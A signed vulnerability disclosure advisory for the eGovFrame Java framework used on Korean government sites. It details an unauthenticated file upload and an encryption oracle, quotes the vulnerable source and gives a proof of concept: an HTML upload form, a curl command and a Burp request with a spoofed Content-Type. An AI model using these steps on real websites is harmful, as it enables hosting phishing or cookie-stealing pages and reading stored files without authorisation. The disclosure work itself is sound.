@@ -1,0 +1,653 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+## Advisory Information
+
+Title: 2 vulnerabilities in Egovframe
+Advisory URL: https://pierrekim.github.io/advisories/2025-egovframe.txt
+Blog URL: https://pierrekim.github.io/blog/2025-11-20-egovframe-2-vulnerabilities.html
+Date published: 2025-11-20
+Vendors contacted: KISA/KrCERT
+Release mode: Released
+CVE: CVE-2025-34336, CVE-2025-34337
+
+
+
+## Product description
+
+> eGovFrame, the e-Government Standard Framework, is a platform-specific standardized development framework for public sector IT projects in Korea.
+> It is developed by the government of the Republic of Korea and can be used by every person all over the world.
+>
+> From https://www.egovframe.go.kr/eng/sub.do?menuNo=2
+
+Egovframe is a Java-based framework mainly used in the websites of the Government of South Korea (Korea).
+
+
+
+## Vulnerabilities Summary
+
+Vulnerable versions: currently existing all versions.
+
+The summary of the vulnerabilities is:
+
+1. CVE-2025-34336 - Unauthenticated file upload vulnerability
+2. CVE-2025-34337 - Pre-authenticated Cryptographic Oracle
+
+
+_Miscellaneous notes_:
+
+These vulnerabilities were discovered in March 2023 after a brief security assessment (2-3 hours) on egovframe and were reported to KrCERT in April 2023 through POC Security, a Korean cybersecurity company acting as a trusted third party.
+
+Due to previous bad experiences when reporting vulnerabilities directly to KrCERT, I preferred using a reputable Korean cybersecurity company - POC Security - who could act as a third party. The initial advisories were given to POC Security at the Zer0con conference in April 2023.
+
+In August 2023, KISA confirmed that the vulnerabilities were exploitable. In October 2023, KISA confirmed that the vulnerabilities had been patched. In September 2025, I confirmed that the following vulnerabilities had not been properly patched.
+
+These vulnerabilities allow an unauthenticated remote attacker to upload any file to websites based on "egovframework", a solution widely used on Korean government websites.
+
+Furthermore, this program does not appear to be tracked by CVE identifiers. Instead, KVE identifiers are used:
+
+> KVE stands for Korea Vulnerabilities and Exposures, which is a system used in South Korea for cataloging and tracking security vulnerabilities. Contrary to CVEs and CNNVDs, it is unclear if KVE entries  are public.
+
+Analyzing the source code and searching for "KISA" (the agency managing KrCERT), I could find approximately 260 mentions of vulnerabilities fixed by KISA. It appears that these vulnerabilities were not publicly tracked outside of the source code (I found only three KVE-2025-XXXX entries in a PDF file announcing a new release).
+
+We can list the vulnerabilities detected and fixed by KISA by searching for comments containing "KISA" and "YYYY-MM-DD". Unfortunately, the reported vulnerabilities are not found there.
+
+    kali% for i in $(seq 2010 2025);do echo -n "$i - "; rgrep "$i" |grep -c KISA | grep -v ' - 0$';done
+    2012 - 6
+    2018 - 161
+    2019 - 65
+    2020 - 18
+    2022 - 1
+    2024 - 1
+    2025 - 2
+    kali%
+
+For example: https://github.com/eGovFramework/egovframe-common-components/blob/main/src/main/java/egovframework/com/utl/sys/pxy/web/EgovProxySvcController.java#L176.
+
+We also note that all version changelogs indicate that some vulnerabilities have been fixed without any information: https://github.com/eGovFramework/egovframe-common-components/releases.
+
+Since vulnerability tracking is quite difficult, using this solution seems like a questionable choice from a risk management point of view.
+
+On a positive note, these results mean there is plenty of room for improvement.
+
+_Impacts_
+
+An unauthenticated remote attacker can upload any file to any website based on the egovframework. Since the content type was controlled by the attacker (up to version 4.1.2), it was possible to host any type of content on the remote website, such as a phishing webpage or a webpage with JavaScript to steal cookies. Since version 4.1.2, it is possible to download any image uploaded with the correct content type.
+Any file uploaded other than an image will be served with the `application/octet-stream` content type (the content type is no longer controlled by the attacker).
+
+The malicious file will then be available on the targeted website via a specific API accessible without authentication.
+
+It is possible to exploit a cryptographic Oracle to create valid and custom encrypted variables. These malicious encrypted strings will be then fully trusted and can be used to abuse internal services.
+
+_Recommendations_
+
+Do not expose Egovframe-based websites on the Internet.
+
+
+
+## Unpatched vulnerabilities
+
+Vulncheck assigned the following CVEs in November 2025:
+
+- - CVE-2025-34336 - eGovFramework <= 4.3.1 Unauthenticated File Upload via Web Editor Image Upload Endpoints
+- - CVE-2025-34337 - eGovFramework <= 4.3.1 Unauthenticated Encryption Oracle via Web Editor Image Upload Endpoints
+
+These KVEs have been assigned by KISA/KrCERT:
+
+- - KVE-2023-5280 Unauthenticated File upload in egovframework
+- - KVE-2023-5281 encryption Oracle to craft custom valid encrypted variables
+
+
+
+## Identification of the solution
+
+For this advisory, the latest version as of the date of this security advisory was obtained via the official git repository at https://github.com/eGovFramework/egovframe-common-components.
+
+The latest commit is:
+
+    commit 7030600a8d959fbdb09787cd346be9ccf2c2dc1c (HEAD -> main, origin/main, origin/HEAD)
+    Merge: e10475cc b354bbb7
+    Author: eGovFrameSupport <egovframesupport@gmail.com>
+    Date:   Wed Sep 24 14:49:27 2025 +0900
+
+There were some changes in the source codes since March 2023, including a incorrect attempt to fix one of the vulnerabilities after I reported it - it is unclear if this was a bug collision (someone else was credited for this vulnerability in the source codes).
+
+
+
+## Details - Unauthenticated file upload vulnerability
+
+An attacker can upload any file without authentication on a website developed with the egov framework.
+
+The vulnerable component `egovframe-common-components` is used by the egovframe framework.
+
+The `/utl/wed/insertImage.do` and `/utl/wed/insertImageCk.do` POST APIs defined in the `egovframe-common-components/src/main/java/egovframework/com/utl/wed/web/EgovWebEditorImageController.java` file do not implement authentication as shown below:
+
+[code:java]
+ 60         private final String extWhiteList = EgovProperties.getProperty("Globals.fileDownload.Extensions");
+[...]
+ 76         /**
+ 77          * ??? Upload? ????.
+ 78          *
+ 79          * @param model
+ 80          * @return
+ 81          * @throws Exception
+ 82          */
+ 83         @RequestMapping(value="/utl/wed/insertImage.do", method=RequestMethod.GET)
+ 84         public String goInsertImage(Model model) throws Exception {
+ 85 
+ 86                 return "egovframework/com/utl/wed/EgovInsertImage";
+ 87         }
+ 88 
+ 89 
+ 90         /**
+ 91          * ??? Upload? ????.
+ 92          *
+ 93          * @param request
+ 94          * @param model
+ 95          * @return
+ 96          * @throws Exception
+ 97          */
+ 98         @RequestMapping(value="/utl/wed/insertImage.do", method=RequestMethod.POST)
+ 99         public String imageUpload(MultipartHttpServletRequest request, Model model) throws Exception {
+100 
+101                 uploadImageFiles(request, model);
+102                 return "egovframework/com/utl/wed/EgovInsertImage";
+103         }
+104 
+105         /**
+106          * ??? Upload(CK???)? ????.
+107          *
+108          * @param ckEditorFuncNum
+109          * @param mRequest
+110          * @param response
+111          * @param model
+112          * @return
+113          * @throws Exception
+114          */
+115         @RequestMapping(value="/utl/wed/insertImageCk.do", method=RequestMethod.POST)
+116         public String imageUploadCk(@RequestParam(value="CKEditorFuncNum", required=false) String ckEditorFuncNum, MultipartHttpServletRequest mRequest, HttpServletResponse response, Model model) throws Exception {
+117                 // Spring multipartResolver ?commons-fileupload?
+118                 //List<EgovFormBasedFileVo> list = EgovFormBasedFileUtil.uploadFiles(request, uploadDir, maxFileSize);
+119                 model.addAttribute("ckEditorFuncNum", ckEditorFuncNum);
+120                 uploadImageFiles(mRequest, model);
+121                 return "egovframework/com/utl/wed/EgovUploadImageComplete";
+122         }
+[/code]
+
+These APIs will ultimately call the method `uploadImageFiles()` defined on line 129:
+
+[code:java]
+124         /**
+125          * @param mRequest
+126          * @param model
+127          * @throws Exception
+128          */
+129         private void uploadImageFiles(MultipartHttpServletRequest mRequest, Model model) throws Exception {
+130 
+131                 try {
+132                         List<EgovFormBasedFileVo> list = EgovFileUploadUtil.uploadFilesExt(mRequest, uploadDir, maxFileSize, extWhiteList);
+133                         if (list.size() > 0) {
+134                                 EgovFormBasedFileVo vo = list.get(0);   // ??? ???
+135 
+136                                 String url = mRequest.getContextPath()
+137                                                 + "/utl/web/imageSrc.do?"
+138                                                 + "path=" + this.encrypt(vo.getServerSubPath())
+139                                                 + "&physical=" + this.encrypt(vo.getPhysicalName())
+140                                                 + "&contentType=" + this.encrypt(vo.getContentType());
+141 
+142                                 model.addAttribute("url", url);
+143                                 model.addAttribute("msg",egovMessageSource.getMessage("success.file.transfer"));
+144                         }
+145                 } catch (SecurityException e) {
+146                         model.addAttribute("url", "");
+147                         model.addAttribute("msg",egovMessageSource.getMessage("errors.file.extension"));
+148                 } catch (Exception e) {
+149                         LOGGER.error(e.getMessage());
+150                         model.addAttribute("url", "");
+151                         model.addAttribute("msg",egovMessageSource.getMessage("errors.file.transfer"));
+152                 }
+153         }
+[/code]
+
+The `uploadFilesExt()` method is implemented in `egovframe-common-components/src/main/java/egovframework/com/utl/fcc/service/EgovFileUploadUtil.java`:
+
+[code:java]
+113         public static List<EgovFormBasedFileVo> uploadFilesExt(MultipartHttpServletRequest mptRequest, String where, long maxFileSize, String extensionWhiteList) throws Exception {
+114                 List<EgovFormBasedFileVo> list = new ArrayList<EgovFormBasedFileVo>();
+[...]
+115 
+116                 if (mptRequest != null) {
+117                         Iterator<?> fileIter = mptRequest.getFileNames();
+118 
+119                         while (fileIter.hasNext()) {
+120                                 MultipartFile mFile = mptRequest.getFile((String)fileIter.next());
+[...]
+127                                 EgovFormBasedFileVo vo = new EgovFormBasedFileVo();
+128 
+129                                 String tmp = mFile.getOriginalFilename();
+[...] // verification of the extension:
+138                                         if (tmp.lastIndexOf(".") > 0) {
+139                                                 ext = getFileExtension(tmp).toLowerCase();
+140                                         } else {
+141                                                 throw new SecurityException("Unacceptable file extension."); // ??
+142                                         }
+143                                         if (extensionWhiteList.indexOf(ext) < 0) {
+144                                                 throw new SecurityException("Unacceptable file extension."); // ??
+145                                         }
+[...] // file is stored inside the filesystem:
+147                                         vo.setFileName(tmp);
+148                                         vo.setContentType(mFile.getContentType());
+149                                         vo.setServerSubPath(getTodayString());
+150                                         vo.setPhysicalName(getPhysicalFileName() + "." + ext);
+151                                         vo.setSize(mFile.getSize());
+152 
+153                                         if (tmp.lastIndexOf(".") >= 0) {
+154                                                 vo.setPhysicalName(vo.getPhysicalName()); // 2012.11 KISA ????
+155                                         }
+156 
+157                                         if (mFile.getSize() > 0) {
+158                                                 InputStream is = null;
+159 
+160                                                 try {
+161                                                         is = mFile.getInputStream();
+162                                                         String fullPath = where + SEPERATOR + vo.getServerSubPath() + SEPERATOR + vo.getPhysicalName() + "_upfile";
+163                                                         saveFile(is, new File(EgovWebUtil.filePathBlackList( fullPath )));
+164                                                 } finally {
+165                                                         if (is != null) {
+166                                                                 is.close();
+167                                                         }
+168                                                 }
+169                                                 list.add(vo);
+170                                         }
+171                                 }
+172                         }
+173                 }
+174 
+175                 return list;
+176         }
+[/code]
+
+And the `saveFile()` method on line 163 will simply save the file on disk using `FileCopyUtils.copy()`.
+
+Ultimately, the `uploadImageFiles()` method will store any uploaded file in the filesystem with a semi-controlled filename (composed with a UUID and a specific extension) but actually, the following values will be controlled by an attacker:
+
+- - the content;
+- - the "public" filename, different from the filename used inside the file system;
+- - the Content-Type that will be displayed to the remote client when the file is retrieved.
+
+We do not care about the real filename in the filesystem as we will use the `/utl/web/imageSrc.do` to retrieve the uploaded content.
+
+Additionally, only specific extensions are allowed in the configuration files. These restrictions are defined in
+https://github.com/eGovFramework/egovframe-common-components/blob/main/src/main/resources/egovframework/egovProps/globals.properties#L168.
+
+In any case, since the attacker is able to control the resulting Content-type, any file can be uploaded/downloaded (e.g. a file with the `.jpg` extension containing HTML code that will be returned as a HTML file when it is retrieved from the Internet).
+
+Content of `egovframe-common-components/src/main/resources/egovframework/egovProps/globals.properties`:
+
+    171 Globals.fileDownload.Extensions = .gif.jpg.jpeg.png
+
+After the upload is done, an url will be displayed, allowing to retrieve the uploaded file. This URL is in the form of  `/utl/web/imageSrc.do?path=X&physical=X&contentType=X` (lines 136 to 142):
+
+Content of `egovframe-common-components/src/main/java/egovframework/com/utl/wed/web/EgovWebEditorImageController.java` to illustrate how this URL is generated:
+
+[code:java]
+136                                 String url = mRequest.getContextPath()
+137                                                 + "/utl/web/imageSrc.do?"
+138                                                 + "path=" + this.encrypt(vo.getServerSubPath())
+139                                                 + "&physical=" + this.encrypt(vo.getPhysicalName())
+140                                                 + "&contentType=" + this.encrypt(vo.getContentType());
+141 
+142                                 model.addAttribute("url", url);
+143                                 model.addAttribute("msg",egovMessageSource.getMessage("success.file.transfer"));
+[/code]
+
+The file will not be directly accessible because the variables have been encrypted, probably following a security assessment carried out by KISA in 2017 and 2018.
+
+By encrypting the variables, as long as the secret key is not known to the attackers (and is correctly set), it is impossible to exploit the following arbitrary file reading (lines 165 to 168) in the `/utl/web/imageSrc.do` API:
+
+Content of `egovframe-common-components/src/main/java/egovframework/com/utl/wed/web/EgovWebEditorImageController.java`:
+
+[code:java]
+162         @RequestMapping(value="/utl/web/imageSrc.do",method=RequestMethod.GET)
+163         public void download(HttpServletRequest request, HttpServletResponse response) throws Exception {
+164                 //2017.12.12 - ?? ?? ?? ?? ??? ??
+165                 //KISA ???? ?? (2018-10-29, ???)
+166                 String subPath = this.decrypt(EgovStringUtil.isNullToString(request.getParameter("path")));
+167                 String physical = this.decrypt(EgovStringUtil.isNullToString(request.getParameter("physical")));
+168                 String mimeType = this.decrypt(EgovStringUtil.isNullToString(request.getParameter("contentType")));
+169 
+170                 if (subPath.indexOf("..") >= 0 ) throw new Exception("Security Exception - illegal url called.");
+171                 if (physical.indexOf("..") >= 0 ) throw new Exception("Security Exception - illegal url called.");
+172 
+173                 String ext = "";
+174                 if ( physical.lastIndexOf(".") > 0 )
+175                         ext = physical.substring(physical.lastIndexOf(".") + 1,physical.length()).toLowerCase();
+176                 if ( ext == null ) throw new FileNotFoundException();
+177 
+178                 if ( extWhiteList.indexOf(ext) >= 0 )
+179                         EgovFormBasedFileUtil.viewFile(response, uploadDir, subPath, physical, mimeType);
+180                 else
+181                         throw new FileNotFoundException();
+182         }
+[/code]
+
+The `/utl/web/imageSrc.do` API allows to retrieve the uploaded file with the 3 encrypted values below, returned at the end of the upload process:
+
+- - path;
+- - physical;
+- - contentType.
+
+By visiting the displayed URL containing the 3 encrypted values, we can retrieve the uploaded document.
+
+Regarding the reflected `Content-Type`, it is worth noting that a protection was added to the `viewFile()` method in June 2023.
+
+It is unclear whether this was an attempt to fix the upload vulnerability (fixing the consequences instead of the root cause is usually ineffective - you can still upload whatever you want). A whitelist was implemented to allow only specific MIME types. Thus, anything other than `image/gif`, `image/jpg`, `image/jpeg`, and `image/png` will appear as an `application/octet-stream`:
+
+The changelog is:
+
+    * 2023.06.27 Kim Hye-jun NSR Security Measures (Script Execution Vulnerability in CKEditor Image Viewing Function)
+
+My initial analysis was actually performed in March 2023, before this commit and I believe this is an attempt to incorrectly patch the vulnerability (since the initial analysis was given to POC Security and shared with KISA in April 2023).
+At that time, the following mimeType verification was not implemented: https://github.com/eGovFramework/egovframe-common-components/blame/e7b8d0df75664ce71781720801fa1ae2d7302a58/src/main/java/egovframework/com/utl/fcc/service/EgovFormBasedFileUtil.java#L277:
+
+[code:java]
+218         public static void viewFile(HttpServletResponse response, String where, String serverSubPath, String physicalName,
+219                         String mimeTypeParam) throws Exception {
+220                 String mimeType = mimeTypeParam;
+221                 String downFileName = where + SEPERATOR + serverSubPath + SEPERATOR + physicalName + "_upfile";
+[...]
+239                 boolean contentTypeFlag = false;
+240                 if (mimeType != null) {
+241                         Map<String, String> contentTypeWL = getContentTypeWL();
+242                         if (contentTypeWL != null) {
+243                                 for (String ext : contentTypeWL.keySet()) {
+244                                         String matchMimeType = contentTypeWL.get(ext);
+245                                         if (matchMimeType.equals(mimeType)) {
+
+// if the provided mimeType was found in the hash table (line 262), contentTypeFlag is set to true
+
+246                                                 response.setContentType(matchMimeType); 
+247                                                 contentTypeFlag = true;
+248                                                 break;
+249                                         }
+250                                 }
+251                         }
+252                 }
+
+// application/octet-stream is used if the contentTypeFlag is still false
+
+253                 if (!contentTypeFlag) {
+254                         response.setContentType("application/octet-stream;");
+255                 }
+256
+257                 response.setHeader("Content-Disposition", "filename=image;");
+258
+259                 FileCopyUtils.copy(new FileInputStream(file), response.getOutputStream());
+260         }
+261
+262         public static Map<String, String> getContentTypeWL() {
+263                 Map<String, String> contentTypeWL = new HashMap<>();
+264
+265                 contentTypeWL.put("gif", "image/gif");
+266                 contentTypeWL.put("jpg", "image/jpg");
+267                 contentTypeWL.put("jpeg", "image/jpeg");
+268                 contentTypeWL.put("png", "image/png");
+269
+270                 return contentTypeWL;
+271         }
+272 }
+[/code]
+
+However, this modification does not fix the root cause (file upload) and it is still possible to upload any file and download them (with a resulting `application/octet-stream` as the Content-Type).
+
+PoC:
+
+Exploit is attached. Just change 192.168.0.1 to the targeted URL, visit this webpage and upload any file:
+
+[code:html]
+<html>
+<head>
+</head>
+<body>
+<form action="http://192.168.0.1/utl/wed/insertImageCk.do" method="post" enctype="multipart/form-data">
+<label for="file">Filename:</label>
+<input type="file" name="file" id="file" />
+<br />
+<input type="submit" name="submit" value="Submit" />
+</form>
+</body>
+</html>
+[/code]
+
+The API will return the resulting path of the file reachable using `/utl/web/imageSrc.do` directly in the browser.
+
+Curl can also be used but a proxy, e.g. Burp Suite, is required to edit the `Content-Type` on the fly (`Content-Type` will be set to `text/plain` if a `.txt` file is uploaded, `image/jpeg` for a `.jpg` file, `text/html` if a `.html` file is uploaded). 
+
+    kali% curl -kv -F "file=@1.txt; filename=1.txt" http://192.168.0.1/utl/wed/insertImageCk.do
+
+BURP request:
+
+    POST /utl/wed/insertImageCk.do HTTP/1.1
+    Host: 192.168.0.1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary=---------------------------26979662282534656852357513795
+    Content-Length: 345
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    
+    
+    -----------------------------26979662282534656852357513795
+    Content-Disposition: form-data; name="file"; filename="1.png" <- The filename that must contain an allowed extension
+    Content-Type: text/html <--------------------------------------- Content-Type that will be used
+    
+    11111111111 <--------------------------------------------------- Content of the file, actually unrelated to the previous extension
+    -----------------------------26979662282534656852357513795
+    Content-Disposition: form-data; name="submit"
+    
+    
+    
+    Submit
+    -----------------------------26979662282534656852357513795--
+
+An attacker can upload any document and control the Content-Type that will be used when retrieving the file using the API `/utl/web/imageSrc.do`.
+
+
+
+## Details - Pre-authenticated Cryptographic Oracle
+
+The previous upload form can be used as a cryptographic oracle. This form will happily return encrypted values for plain-text values defined by the attacker.
+
+These encrypted variables will then be completely trusted by the application.
+
+At line 139 and 140, it is possible to use this encryption oracle to receive the encrypted string of any filename and content-type controlled by an attacker, by sending a custom Content-type or a custom filename in the upload form using the `/utl/wed/insertImage.do` and `/utl/wed/insertImageCk.do` APIs (calling the `uploadImageFiles()` method):
+
+Content of `egovframe-common-components/src/main/java/egovframework/com/utl/wed/web/EgovWebEditorImageController.java`:
+
+[code:java]
+137                                                 + "/utl/web/imageSrc.do?"
+138                                                 + "path=" + this.encrypt(vo.getServerSubPath())
+139                                                 + "&physical=" + this.encrypt(vo.getPhysicalName())
+140                                                 + "&contentType=" + this.encrypt(vo.getContentType());
+141 
+142                                 model.addAttribute("url", url);
+143                                 model.addAttribute("msg",egovMessageSource.getMessage("success.file.transfer"));
+[/code]
+
+An attacker can send malicious Content-type or filename variables: these strings will be encrypted using the method `encrypt()` with a secret key defined server-side.
+
+The resulting URL displayed on the webpage will contain the encoded `contentType` and `Filename` after submitting the upload form.
+
+Then, an attacker can use the encrypted-malicious strings to abuse internal services.
+
+For example, the `/utl/web/imageSrc.do` API relies on encrypted data to read files in the filesystem: an attacker can use encrypted malicious strings (e.g. `subPath`, `physical` and `mimeType` variables) with the `/utl/web/imageSrc.do` API, these variables will be decrypted, corresponding to specific attacker-controlled strings (lines 166 to 188):
+
+[code:java]
+162         @RequestMapping(value="/utl/web/imageSrc.do",method=RequestMethod.GET)
+163         public void download(HttpServletRequest request, HttpServletResponse response) throws Exception {
+164                 //2017.12.12 - ??
+165                 //KISA ?? (2018-10-29, ???
+166                 String subPath = this.decrypt(EgovStringUtil.isNullToString(request.getParameter("path"))); <---------------------- controlled by an attacker
+167                 String physical = this.decrypt(EgovStringUtil.isNullToString(request.getParameter("physical"))); <----------------- controlled by an attacker
+168                 String mimeType = this.decrypt(EgovStringUtil.isNullToString(request.getParameter("contentType"))); <-------------- controlled by an attacker
+169 
+170                 if (subPath.indexOf("..") >= 0 ) throw new Exception("Security Exception - illegal url called.");
+171                 if (physical.indexOf("..") >= 0 ) throw new Exception("Security Exception - illegal url called.");
+172 
+173                 String ext = "";
+174                 if ( physical.lastIndexOf(".") > 0 )
+175                         ext = physical.substring(physical.lastIndexOf(".") + 1,physical.length()).toLowerCase();
+176                 if ( ext == null ) throw new FileNotFoundException();
+177 
+178                 if ( extWhiteList.indexOf(ext) >= 0 )
+179                         EgovFormBasedFileUtil.viewFile(response, uploadDir, subPath, physical, mimeType);
+180                 else
+181                         throw new FileNotFoundException();
+182         }
+[/code]
+
+Another example is the `/cmm/fms/getImage.do` API defined in `egovframe-common-components/src/main/java/egovframework/com/cmm/web/EgovImageProcessController.java` that will return any stored file depending on an encrypted variable provided by an attacker.
+
+The `atchFileId` parameter obtained in the `GET` request is decrypted on line 83 and then:
+
+- - `decodedSessionId` is obtained before the `|` character;
+- - `decodedFileId` is obtained after the `|` character.
+
+A verification is done on line 94, to check if the decrypted `decodedSessionId` is identical to the current `SessionId` found in the HTTP header. This `SessionId` is actually available in the HTTP requests (JSESSIONID=`value`) so this verification can be bypassed by encrypting this value on the upload form and recover it.
+
+An attacker can also omit the `JSESSIONID` cookie in the HTTP request and pass an empty string for the decoded value of `decodedSessionId`.
+
+And then an attacker can recover any file based on the `decodedFileId` value (e.g. FILE_000000000000001) without authentication.
+
+[code:java]
+ 75         @RequestMapping("/cmm/fms/getImage.do")
+ 76         public void getImageInf(SessionVO sessionVO, ModelMap model, @RequestParam Map<String, Object> commandMap,
+ 77                         HttpServletRequest request, HttpServletResponse response) throws Exception {
+ 78 
+ 79                 // ?? FileId (2022.12.06 )
+ 80                 // ???
+ 81                 String param_atchFileId = (String) commandMap.get("atchFileId");
+ 82                 param_atchFileId = param_atchFileId.replaceAll(" ", "+");
+ 83                 byte[] decodedBytes = Base64.getDecoder().decode(param_atchFileId);
+ 84                 String decodedString = cryptoService.decrypt(new String(decodedBytes));
+ 85                 String decodedSessionId = StringUtils.substringBefore(decodedString, "|");
+ 86                 String decodedFileId = StringUtils.substringAfter(decodedString, "|");
+ 87 
+ 88                 String fileSn = (String) commandMap.get("fileSn");
+ 89 
+ 90                 String sessionId = request.getSession().getId();
+ 91 
+ 92                 boolean isSameSessionId = StringUtils.equals(decodedSessionId, sessionId);
+ 93 
+ 94                 if (!isSameSessionId) {
+ 95                         throw new Exception();
+ 96                 }
+ 97 
+ 98                 FileVO vo = new FileVO();
+ 99 
+100                 vo.setAtchFileId(decodedFileId);
+101                 vo.setFileSn(fileSn);
+102 
+103                 // ------------------------------------------------------------
+104                 // fileSn???
+105                 // ------------------------------------------------------------
+106                 if (fileSn == null || fileSn.equals("")) {
+107                         int newMaxFileSN = fileService.getMaxFileSN(vo);
+108                         vo.setFileSn(Integer.toString(newMaxFileSN - 1));
+109                 }
+110                 // ------------------------------------------------------------
+111 
+112                 FileVO fvo = fileService.selectFileInf(vo);
+113 
+114                 // String fileLoaction = fvo.getFileStreCours() + fvo.getStreFileNm();
+115 
+116                 String fileStreCours = EgovWebUtil.filePathBlackList(fvo.getFileStreCours());
+117                 String streFileNm = EgovWebUtil.filePathBlackList(fvo.getStreFileNm());
+118                 File file = new File(fileStreCours, streFileNm);
+119 
+120                 ByteArrayOutputStream bStream = null;
+121 
+122                 try (FileInputStream fis = new FileInputStream(file); BufferedInputStream in = new BufferedInputStream(fis);) {
+123                         bStream = new ByteArrayOutputStream();
+124 
+125                         FileCopyUtils.copy(in, bStream);
+126 
+127                         String type = "";
+128 
+129                         if (fvo.getFileExtsn() != null && !"".equals(fvo.getFileExtsn())) {
+130                                 if ("jpg".equals(fvo.getFileExtsn().toLowerCase())) {
+131                                         type = "image/jpeg";
+132                                 } else {
+133                                         type = "image/" + fvo.getFileExtsn().toLowerCase();
+134                                 }
+135                                 /* type = "image/" + fvo.getFileExtsn().toLowerCase(); */
+136 
+137                         } else {
+138                                 LOGGER.debug("Image fileType is null.");
+139                         }
+140 
+141                         response.setHeader("Content-Type", EgovWebUtil.removeCRLF(type));
+142                         response.setContentLength(bStream.size());
+143 
+144                         bStream.writeTo(response.getOutputStream());
+145 
+146                         response.getOutputStream().flush();
+147                         response.getOutputStream().close();
+148 
+149                 } finally {
+150                         EgovResourceCloseHelper.close(bStream);
+151                 }
+152         }
+[/code]
+
+
+
+## Report Timeline
+* Mar 2023: Security assessment performed on egovframe.
+* Apr 2023: Advisories shared with POC Security at the Zer0con conference.
+* Aug 2023: KISA confirmed the exploitability of the vulnerabilties.
+* Oct 2023: KrCERT confirmed to POC Security that vulnerabilities have been patched.
+* Sep 2025: I contacted POC Security to report that, in my opinion, the vulnerabilities had not been properly patched and to ask them to check previous emails with KrCERT.
+* Sep 2025: POC Security confirmed that KrCERT had indicated, during previous exchanges, that all vulnerabilities had been patched.
+* Nov 19, 2025: Vulncheck assigned CVEs.
+* Nov 20, 2025: A security advisory is published.
+
+
+
+## Credits
+
+These vulnerabilities were found by Pierre Barre aka Pierre Kim (@PierreKimSec).
+
+
+
+## References
+
+https://pierrekim.github.io/blog/2025-11-20-egovframe-2-vulnerabilities.html
+
+https://pierrekim.github.io/advisories/2025-egovframe.txt
+
+
+
+## Disclaimer
+
+This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCgAdFiEEoSgI9MSrzxDXWrmCxD4O2n2TLbwFAmke3joACgkQxD4O2n2T
+Lby8og//ftr/S/vGqqLc0wzpPIhSiW/T0HnnV4JhzZQN6t1+XckVZxJu2rIZn4fi
+e89WiB0shMvubjl3zuqDtqWz2FIg4bxQseEd+HOxTTxqmGE8SyB/WKuuogyd1lzd
+f4dce/FNrCrrwHz+69S6NS2unhGmziRiFrhjHviXzF3mMRT+S0OlT+UgIxur3ZKI
+PFbA+795CDdA7HpNGxQ/pONw9gVewGhYjV8GocbEWcgfVcJYt7Rau95jmSHRvsiT
+5Jy5XD+6TZMURvCczGDY4CU/qDjGW6/G6ratPUfvAFl295eC/RxE4JxgSNM7IlT8
+v4ACTeRLduOq6b80Rz3lho1eESaXsaYnpX2nOJ8k9y0dILLfRdXq/xQZW3vNUhCQ
+O1za1idQanUUQ5H11x/nAU21ygY+D2Y84P4brGizkNHs0c005zOVYjKkd5SLjCKF
+vyNLZifyvwoJvv9Z7VefJvFl3tI+nPkUG21UbVRNj1Qpn/RTUHGqCiweNMT2+118
+lF0Xb8kvgXo/bS08f/cb9EZTlXpFvmMy7vlDoi8SbgZ4m4C0jhr3HDQcVZUP4CRL
+rEGljnHmFcDwpqpy6bRZTolwgO/HG6PL0yF6f5/V9s+liTS9v4EhRzjs1nTwd3W9
+U7bdBly2Fk+bvHZtlOilvMxPRHdMjkjdhR3mA/yrNxdmIIZucfA=
+=pGpG
+-----END PGP SIGNATURE-----
